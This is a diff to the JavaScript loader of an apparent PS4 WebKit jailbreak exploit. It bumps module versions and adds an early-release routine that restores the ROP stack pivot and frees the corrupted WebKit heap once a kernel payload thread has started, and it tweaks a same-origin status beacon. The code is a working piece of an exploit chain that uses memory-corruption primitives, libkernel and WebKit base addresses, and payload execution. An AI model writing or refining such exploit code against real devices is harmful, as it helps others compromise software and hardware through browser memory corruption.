@@ -1,7 +1,7 @@
-import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r2";
-import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r2";
-import { int64 } from "./int64.js?v=hen1402r2";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r2";
+import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r3";
+import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r3";
+import { int64 } from "./int64.js?v=hen1402r3";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r3";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -262,12 +262,12 @@ function mark(tag, detail) {
     ),
   );
 
-  if (HANDOFF_OK && /^[A-Za-z0-9_-]{1,40}$/.test(tag)) {
+  if (HANDOFF_OK && tag !== "AG" && /^[A-Za-z0-9_-]{1,40}$/.test(tag)) {
     try {
       const url = "beacon?run=" + encodeURIComponent(params.get("run")) +
         "&tag=" + encodeURIComponent(tag) +
         "&detail=" + encodeURIComponent(String(raw == null ? "" : raw).slice(0, 500));
-      fetch(url, { keepalive: true }).catch(function () {});
+      fetch(url, { cache: "no-store" }).catch(function () {});
     } catch (_) {}
   }
 
@@ -1016,11 +1016,13 @@ let allDone = false,
     }
     if (params.get("afterglow")) {
       let cleanupSafe = false;
+      let terminalReleaseAttempted = false;
+      let terminalReleaseResult = null;
       /* Arming requires a step from the landing page. A probe
          (afterglow=probe) fires no trigger and patches nothing, so a restored
          page may run that. */
       try {
-        const ag = await import("./afterglow-g.js?v=hen1402r2");
+        const ag = await import("./afterglow-g.js?v=hen1402r3");
         // Exactly what afterglow reaches for, counted rather than guessed.
         const agCtx = {
           p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
@@ -1029,6 +1031,37 @@ let allDone = false,
           libkernelBase: libkernelBase, webkitBase: webkitBase,
           stubAddr: stubAddr, off: off,
           prepareMany: prepareMany, runPrepared: runPrepared,
+          releaseAfterPayloadStart: function (status) {
+            if (terminalReleaseAttempted) return terminalReleaseResult;
+            if (!status || status.payload !== true || status.defused !== true)
+              return { pivotRestored: false, coreReleased: false };
+            terminalReleaseAttempted = true;
+            try {
+              terminalReleaseResult = releaseWebKitHeap(p);
+            } catch (_) {
+              terminalReleaseResult = { pivotRestored: false, coreReleased: false };
+            }
+            if (!terminalReleaseResult ||
+                !terminalReleaseResult.pivotRestored ||
+                !terminalReleaseResult.coreReleased) {
+              const pivotOk = !!terminalReleaseResult &&
+                terminalReleaseResult.pivotRestored === true;
+              const coreOk = !!terminalReleaseResult &&
+                terminalReleaseResult.coreReleased === true;
+              mark("WEBKIT-HEAP-RELEASE-FAILED",
+                "early=true pivot=" + pivotOk + " core=" + coreOk);
+              try { clearInterval(watchdog); } catch (_) {}
+              showNotice("Cleanup did not finish. Keep the browser open, fully power off the PS4, and do not retry on this boot.");
+              return terminalReleaseResult;
+            }
+            p = null;
+            mark("WEBKIT-HEAP-RELEASED",
+              "early=true pivot=true core=true rc=" + status.rc +
+              " handle=" + status.handle);
+            try { clearInterval(watchdog); } catch (_) {}
+            try { location.replace("done.html?v=hen1402r3"); } catch (_) {}
+            return terminalReleaseResult;
+          },
         };
         if (params.get("afterglow") === "probe") {
           ag.probeAfterglow(agCtx);
@@ -1049,23 +1082,27 @@ let allDone = false,
         ? "pthread_create returned; HEN status unconfirmed. Leave result on screen"
         : "No payload thread confirmed. Leave page open and fully power off PS4 before retry");
       if (cleanupSafe) {
-        const released = releaseWebKitHeap(p);
-        if (!released.pivotRestored || !released.coreReleased) {
+        const released = terminalReleaseAttempted
+          ? terminalReleaseResult
+          : releaseWebKitHeap(p);
+        if (!released || !released.pivotRestored || !released.coreReleased) {
+          const pivotOk = !!released && released.pivotRestored === true;
+          const coreOk = !!released && released.coreReleased === true;
           mark("WEBKIT-HEAP-RELEASE-FAILED",
-            "pivot=" + released.pivotRestored + " core=" + released.coreReleased);
+            "pivot=" + pivotOk + " core=" + coreOk);
           try { clearInterval(watchdog); } catch (_) {}
           showNotice("Cleanup did not finish. Keep the browser open, fully power off the PS4, and do not retry on this boot.");
           finishUI(true);
           return;
         }
         p = null;
-        mark("WEBKIT-HEAP-RELEASED",
-          "pivot=" + released.pivotRestored + " core=" + released.coreReleased);
+        if (!terminalReleaseAttempted)
+          mark("WEBKIT-HEAP-RELEASED",
+            "early=false pivot=" + released.pivotRestored + " core=" + released.coreReleased);
         try { clearInterval(watchdog); } catch (_) {}
         finishUI(true);
-        setTimeout(function () {
-          try { location.replace("done.html?v=hen1402r2"); } catch (_) {}
-        }, 2000);
+        if (!terminalReleaseAttempted)
+          try { location.replace("done.html?v=hen1402r3"); } catch (_) {}
         return;
       }
       finishUI(payloadRunning);
